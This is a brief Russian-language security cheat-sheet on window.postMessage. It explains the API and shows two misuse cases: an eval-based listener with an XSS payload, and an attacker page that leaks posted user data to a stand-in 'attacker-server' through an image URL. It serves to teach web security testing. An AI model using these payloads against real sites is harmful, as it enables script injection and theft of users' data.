# window.postMessage

## Intro: что такое postMessage

Это метод `cross-origin` коммуникации между элементами `Window`: между страницей и всплывающим окном этой страницы, между страницей и `iframe`, встроенным в нее, и тп

Обычно, скрипты имеют доступ к друг другу на разных страницах если, и только если, имеют одинкавый протокол, хост и порт ([same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin\_policy)). `postMessage` дает безопасный способ обойти это ограничения (если правильно использовать).

В общем, одно окно может получить ссылку на другое (например, через `targetWindow = window.opener`), а затем отправить ему `MessageEvent` с помощью `targetWindow.postMessage()`. Получающее окно тогда свободно обрабатывать это событие по мере необходимости. Аргументы, передаваемые в `window.postMessage()` (то есть «сообщение»), открываются принимающему окну через объект события.

## К чему может привести неправильное использование

### XSS

Где-то обрабатывается message:

```javascript
function (b){b.data.evalCall&&eval("("+b.data.evalCall+")")}
```

Мы отправляем сообщение

```javascript
b.postMessage({"evalCall":"alert(document.domain)"},"*")
```

Это возможно, если секция вызова postMessage является уязвимой или настройка CORS на принимающей стороне является уязвимой.

### Leak Sensitive Data

vuln page

```javascript
function parent_getUserInfo()
{
   var userdata=[name,age, ...];
   parent.postMessage(userdata);
}
```

attacker

```markup
<img src="http://attacker-server/?" id=message> 
<script>
 window.onmessage = function(e){  
  document.getElementById("message").src += "&"+e.data;
 }
</script>
```

## Tools

Есть инструмент для мониторинга использования postMessages - [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker)

Оформлена как Google extension (но и в ff стартует вроде тож)



